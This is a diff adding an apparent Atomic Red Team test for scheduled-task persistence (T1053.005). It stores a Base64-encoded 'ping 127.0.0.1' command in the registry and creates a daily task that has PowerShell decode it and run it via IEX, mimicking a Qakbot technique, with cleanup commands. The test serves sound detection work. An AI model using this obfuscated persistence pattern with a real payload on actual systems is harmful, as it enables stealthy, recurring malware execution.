@@ -1,0 +1,11 @@
+A Base64 Encoded command will be stored in the registry (ping 127.0.0.1) and then a scheduled task will be created. The scheduled task will launch powershell to decode and run the command in the registry daily. This is a persistence mechanism recently seen in use by Qakbot.
+
+Inputs:
+Name	Description	Type	Default Value
+time	Daily scheduled task execution time	string	07:45
+Attack Commands: Run with command_prompt!
+reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f
+schtasks.exe /Create /F /TN "ATOMIC-T1053.005" /TR "cmd /c start /min \"\" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))" /sc daily /st #{time}
+Cleanup Commands:
+schtasks /delete /tn "ATOMIC-T1053.005" /F >nul 2>&1
+reg delete HKCU\SOFTWARE\ATOMIC-T1053.005 /F >nul 2>&1
